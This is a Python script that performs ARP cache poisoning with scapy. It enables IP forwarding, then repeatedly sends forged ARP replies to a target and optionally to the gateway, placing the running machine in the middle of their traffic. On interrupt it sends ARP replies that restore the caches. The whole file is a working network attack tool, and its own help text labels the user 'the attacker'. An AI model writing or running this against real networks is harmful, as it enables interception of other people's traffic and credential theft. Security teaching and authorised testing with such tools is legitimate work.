import argparse
from scapy.all import *
from getmac import get_mac_address
from scapy.layers.l2 import ARP, Ether
import time
import netifaces
import os

# construct the argument parse and parse the arguments


ap = argparse.ArgumentParser()
ap.add_argument("-i", "--iface", required=False,
                help="Interface you wish to use")
ap.add_argument("-s", "--src", required=True,
                help="The address you want for the attacker")
ap.add_argument("-d", "--delay", required=False, default=1,
                help="Delay (in seconds) between messages")
ap.add_argument("-gw", required=False, default=True,
                help="Should GW be attacked as well")
ap.add_argument("-t", "--target", required=True,
                help="Ip of target")
args = vars(ap.parse_args())


# ip_getway = str(netifaces.gateways()['default'][netifaces.AF_INET][0])  # gateway ip


def enable_ip_forward():
    os.system("echo '1' > /proc/sys/net/ipv4/ip_forward")


def disable_ip_forward():
    os.system("echo '0' > /proc/sys/net/ipv4/ip_forward")


def send_fix_message():
    sendp(Ether(dst=get_mac_address(ip=args["target"])) / ARP(pdst=args["target"], psrc=args["src"], hwsrc=get_mac_address(ip=args["src"]), op=2), iface=args["iface"])
    if args["gw"]:  # the Gateway_been_Attacked
        sendp(Ether(dst=get_mac_address(ip=args["src"])) / ARP(pdst=args["src"], psrc=args["target"],
                                                               hwsrc=get_mac_address(ip=args["target"]), op=2),
              iface=args["iface"])


enable_ip_forward()
while True:
    try:
        sendp(Ether(dst=get_mac_address(ip=args["target"])) / ARP(pdst=args["target"], psrc=args["src"], op=2),
              iface=args["iface"])

        if args["gw"]:  # the Gateway_been_Attacked
            sendp(Ether(dst=get_mac_address(ip=args["src"])) / ARP(pdst=args["src"], psrc=args["target"], op=2),
                  iface=args["iface"])

        time.sleep(args["delay"])

    except KeyboardInterrupt:
        disable_ip_forward()
        send_fix_message()
        break
